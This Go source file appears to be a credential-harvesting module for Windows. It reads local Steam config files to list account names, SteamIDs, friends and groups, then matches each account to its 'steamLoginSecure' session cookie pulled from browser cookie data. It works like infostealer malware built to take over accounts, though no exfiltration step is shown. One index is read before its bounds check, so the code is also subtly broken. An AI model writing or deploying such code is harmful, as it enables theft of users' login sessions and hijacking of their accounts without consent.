package main

import (
	"os"
	"regexp"
	"strings"

	"github.com/andygrunwald/vdf"
)

const (
	SteamPath         = "C:\\Program Files (x86)\\Steam"
	SteamConfigPath   = SteamPath + "\\config"
	SteamUserDataPath = SteamPath + "\\userdata"
)

var steamId64Regex = regexp.MustCompile(`^7656119\d{10}$`)

type SteamAccountResult struct {
	SteamID     string
	AccountName string
	Username    string
	AvatarURL   string
	Friends     []string
	Groups      []string
	AuthToken   string
	FoundIn     string
}

var steamAccountResults []SteamAccountResult

func parseLoginUsersVDF() (map[string]map[string]interface{}, error) {
	if _, err := os.Stat(SteamConfigPath); os.IsNotExist(err) {
		return nil, err
	}

	usersFile, err := os.Open(SteamConfigPath + "\\loginusers.vdf")
	if err != nil {
		return nil, err
	}
	defer usersFile.Close()

	p := vdf.NewParser(usersFile)
	root, err := p.Parse()
	if err != nil {
		return nil, err
	}

	users, ok := root["users"].(map[string]interface{})
	if !ok {
		return nil, nil
	}

	result := make(map[string]map[string]interface{})
	for steamID, userData := range users {
		if !steamId64Regex.MatchString(steamID) {
			continue
		}
		userMap, ok := userData.(map[string]interface{})
		if !ok {
			continue
		}
		result[steamID] = userMap
	}

	return result, nil
}

type localConfigResult struct {
	AvatarURL   string
	PersonaName string
	Friends     []string
	Groups      []string
}

func parseLocalConfigVDF() ([]localConfigResult, error) {
	if _, err := os.Stat(SteamUserDataPath); os.IsNotExist(err) {
		return nil, err
	}
	ids, err := os.ReadDir(SteamUserDataPath)
	if err != nil || len(ids) == 0 {
		return nil, err
	}
	result := []localConfigResult{}

	for _, id := range ids {
		localConfigPath := SteamUserDataPath + "\\" + id.Name() + "\\config\\localconfig.vdf"
		if _, err := os.Stat(localConfigPath); os.IsNotExist(err) {
			return nil, err
		}

		localConfigFile, err := os.Open(localConfigPath)
		if err != nil {
			return nil, err
		}
		defer localConfigFile.Close()

		p := vdf.NewParser(localConfigFile)
		root, err := p.Parse()
		if err != nil {
			return nil, err
		}

		store, ok := root["UserLocalConfigStore"].(map[string]interface{})
		if !ok {
			return nil, nil
		}
		res := localConfigResult{Friends: make([]string, 0)}

		friends, ok := store["friends"].(map[string]interface{})
		if !ok {
			return nil, nil
		}
		for friendId, friendData := range friends {
			if !regexp.MustCompile(`^\d+$`).MatchString(friendId) {
				if friendId == "PersonaName" {
					personaName, _ := friendData.(string)
					res.PersonaName = personaName
				}
				continue
			}
			data := friendData.(map[string]interface{})
			if friendId != id.Name() {
				friendName, _ := data["name"].(string)
				// Only users have NameHistory (even if their name was never changed), groups don't
				nameHistory, _ := data["NameHistory"].(map[string]interface{})
				if len(nameHistory) > 0 {
					res.Friends = append(res.Friends, friendName)
				} else {
					res.Groups = append(res.Groups, friendName)
				}
				continue
			}
			me, ok := friends[id.Name()].(map[string]interface{})
			if !ok {
				return nil, nil
			}
			avatar, _ := me["avatar"].(string)
			res.AvatarURL = "https://avatars.fastly.steamstatic.com/" + avatar + "_full.jpg"
		}

		result = append(result, res)
	}

	return result, nil
}

func findAuthToken(steamID string) (string, string) {
	for _, c := range cookies {
		if c.Name == "steamLoginSecure" && c.URL == "store.steampowered.com" && strings.Contains(c.Value, steamID) {
			return c.Value, c.BrowserName
		}
	}
	return "", ""
}

func FindSteamAccounts() error {
	if _, err := os.Stat(SteamPath); os.IsNotExist(err) {
		return nil
	}

	users, err := parseLoginUsersVDF()
	if err != nil || users == nil {
		return nil
	}
	config, err := parseLocalConfigVDF()
	if err != nil || config == nil {
		return nil
	}

	i := 0
	for steamID, userData := range users {
		conf := config[i]
		if i >= len(config) {
			continue
		}
		accountName, _ := userData["AccountName"].(string)
		username, _ := userData["PersonaName"].(string)
		avatarURL := conf.AvatarURL
		authToken, browserAuthToken := findAuthToken(steamID)
		steamAccountResults = append(steamAccountResults, SteamAccountResult{
			SteamID:     steamID,
			AccountName: accountName,
			Username:    username,
			AvatarURL:   avatarURL,
			Friends:     conf.Friends,
			Groups:      conf.Groups,
			AuthToken:   authToken,
			FoundIn: func() string {
				if browserAuthToken != "" {
					return "Steam Client, " + browserAuthToken
				}
				return "Steam Client"
			}(),
		})

		i++
	}

	return nil
}
